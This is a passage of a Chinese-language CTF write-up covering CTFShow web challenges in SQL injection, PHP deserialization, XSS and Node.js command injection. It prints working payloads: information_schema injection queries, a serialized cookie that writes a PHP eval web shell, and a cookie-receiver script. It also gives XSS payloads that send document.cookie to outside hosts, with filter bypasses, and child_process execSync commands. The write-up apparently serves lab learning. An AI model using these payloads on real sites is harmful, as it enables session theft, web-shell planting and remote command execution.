sds_name='".$dpt_name."',sds_address ='".$dpt_address."',sds_build_date='".$dpt_build_year."',sds_have_safe_card='".$dpt_has_cert."',sds_safe_card_num='".$dpt_cert_number."',sds_telephone='".$dpt_telephone_number."';";
$result=$mysqli->query($sql);
echo $sql;
```

手动操作步骤如下：

1. 对dpt_name，先输入1‘,闭合函数
2. 然后，再接上sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database()) #以查询表名。得到结果为sds_dpt, sds_fl9g, sds_user，重点在sds_fl9g
3. 接着，再接上sds_address=(select group_concat(column_name) from information_schema.columns where table_name = 'sds_fl9g') #,查询表sds_fl9g的列名，得到结果为flag
4. 最后，再接上sds_address=(select flag from sds_fl9g) #， 得到flag的值

![成功](.\代码审计\web303\flag.png)



### web304

给的源码中没找到waf，网页测试中也没过滤，只是将数据库名改为了sds_flaag

啥东西？

![成功](F:\CTFShow-Web\Web入门\代码审计\web304\flag.png)



### web305（getshell但卡了……）

前面同web303-304，admin/admin进入后台。

然后发现了waf

```php
function sds_waf($str){
	if(preg_match('/\~|\`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\{|\}|\[|\]|\;|\:|\'|\"|\,|\.|\?|\/|\\\|\<|\>/', $str)){
		return false;
	}else{
		return true;
	}
}
```

也就是说所有的sql必要字符都被过滤了，不要想着在这里搞事。

再找找新的东西。

```php
$user_cookie = $_COOKIE['user'];
if(isset($user_cookie)){
	$user = unserialize($user_cookie);
}
```

哦？反序列化？

查看class.php

```php
class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
	public function __destruct(){
		file_put_contents($this->username, $this->password);
	}
```

那就没什么好说的了，file_put_content会将后面的内容写入前面。准备挂马。

```
class user{
    public $username;
    public $password;
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __destruct(){
        file_put_contents($this->username, $this->password);
    }
}

$ctfshow = new user('a.php','<?php eval($_POST[1]);?>');
var_dump(urlencode(serialize($ctfshow)));
```

得到结果为：

```
O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22a.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D
```

通过名为user的cookie传入。

![](.\代码审计\web305\挂马.png)

antsword连接发现只有源代码……flag呢？

看来flag挂在sql上了。

更改为数据库连接模式

![](.\代码审计\web305\数据库连接.png)



SELECT `flag` FROM `sds_flabag` ORDER BY 1 DESC LIMIT 0,20;

然后卡了……我去。



### web306





## XSS

> document.cookie							用于js获取当前网页的cookie值
> window.location.href					 用于获取当前页面地址链接
> window.location.href='www.baidu.com'	  用于相当于跳转地址
>
> 服务器准备的接收文件：xss.php
> <?php
> $cookie=$_GET['cookie'];
> $myfile=fopen('cookie.txt','w+');
> fwirte($myfile,$cookie);
> fclose($myfile);
> ?>
>
> http://[ip]/xss.php?cookie=document.cookie		用于给服务器发送当前界面的coolie
> window.location.href='http://[ip]/xss.php?cookie='+document.cookie	用于指向服务器ip并把当前界面的cookie值作为get参数发送过去
>
> 最后的js语句payload：
> <script>window.location.href='http://[ip]/xss.php?cookie='+document.cookie</script>

### web316

去**控制台**输入以下指令：alert(document.cookie)

得到的信息为：

```
PHPSESSID=ptnd4qql435ille8hetr5bkij4; flag=you%20are%20not%20admin%20no%20flag
```

在ceye网站上注册临时域名，用它来反射出cookie。

payload：

```
<script> var img=document.createElement("img"); img.src="http://hi8y3b.ceye.io/"+document.cookie; </script>
```

在后台里面得到flag

![](.\XSS\图片\web316.png)

经历了30多分钟，不容易啊。

对payload的解释：

```
var img=document.createElement("img");  //这个是生成一个img对象
img.src="http://hi8y3b.ceye.io/"+document.cookie; 
/*是加载一张图片加上当前的cookie这里我们填写的是接收平台的地址，所以带上document.cookie去加载地址然后平台会有记录cookie的值，ctf平台会有个虚拟机器人，充当admin身份，每隔一段时间点开网站它一点开就会加载payload，发送它自身的cookie在那个框内输入那个标签输进去，网站一加载就执行了我们输入的xss代码然后他自己会发送cookie*/
```



### web317

用上一次的payload试了一下，不行。

因为带有过滤了

思路：用body语句生成可绕过过滤的payload：

```
<body onload="window.open('http://hi8y3b.ceye.io/'+document.cookie)"></body>
```

此时会因为window.open()的作用弹出新的窗口，上面写着

```
{"meta": {"code": 201, "message": "HTTP Record Insert Success"}}
```

说明消息发送成功，那XSS应该也反弹生效了，回ceye查看后台可获得flag

![](.\XSS\图片\web317.png)



### web318

过滤条件增加了

```
<body onload="window.open('http://hi8y3b.ceye.io/'+document.cookie)"></body>
```

这个payload依旧管用，先用着。

![](.\XSS\图片\web318.png)



### web319

过滤条件又增加了

```
<body onload="window.open('http://hi8y3b.ceye.io/'+document.cookie)"></body>
```

但这个payload依旧坚挺。

![](.\XSS\图片\web319.png)





### web320

不知道过滤了什么，一个个试。

```
document.cookie">
+document.cookie">
xss='+document.cookie">
='http://[ip]/xss.php?xss='+document.cookie">
="document.location.href='http://[ip]/xss.php?xss='+document.cookie">
onload="document.location.href='http://[ip]/xss.php?xss='+document.cookie">
```

以上这些都是能够正常上传的，但再加上前面的一个空格就不行了，从而可知过滤的是空格

替换方法还是有的：`tab、/**/`

payload:

```
<body/**/onload="window.open('http://we1wmh.ceye.io/'+document.cookie)"></body>
```

结果：

```
{"meta": {"code": 201, "message": "HTTP Record Insert Success"}}
```

![](.\XSS\图片\web320.png)



### web321-326

```
<body/**/onload="window.open('http://we1wmh.ceye.io/'+document.cookie)"></body>
```

过滤了XSS，但我没有用过。

![](.\XSS\图片\web321.png)



### web327(VPS)

现在开始，学习存储型XSS

> 嵌入到web页面的恶意HTML会被存储到应用服务器端，简而言之就是会被存储到数据库（日志等也可），等用户打开页面时，会继续执行恶意代码，能够持续的攻击用户。
>
> 如何操作存储型XSS： 嵌入到web页面的恶意代码被存储到服务器上，例如在注册时候将用户昵称设置为XSS恶意代码，那么访问某些页面会显示用户名的时候就会触发恶意代码。
>
> JS属于前端代码，如果植入恶意代码成功，JS代码是不会显示出来的。
>
> 存储型XSS与反射型XSS的区别： 存储型存入数据库中，可持续时间长，而反射型持续时间短，仅对本次访问有影响，反射型一般要配合社工。
>
> 存储型XSS可以通过弹窗验证，不过不建议，会破坏网站结构，引起管理员的主意。
>
> 存储型XSS可能出现的位置：
> （1）用户注册
> （2）留言板
> （3）上传文件的文件名处
> （4）管理员可见的报错信息
> （5）在线聊天框
> （6）客服
> （7）问题反馈区
> （8）邮件信箱
> 理论上，见框就插。

```
<body/onload=location.href="http://124.223.171.164/home/chenshi/x.php?cookie="+document.cookie>
```



## node.js

### web334

文件里全暴露了



### web335

```
?eval=require('child_process').execSync('ls');
```

noScript显示这是XSS攻击。文件在fl00g.txt中

```
?eval=require('child_process').execSync('cat fl00g.txt');
```



### web336

```
?eval=require('child_process').spawnSync('ls').stdout.toString()
```

flag在fl001g.txt中

```
?eval=require('child_process').spawnSync('cat fl001g.txt').stdout.toString()
```

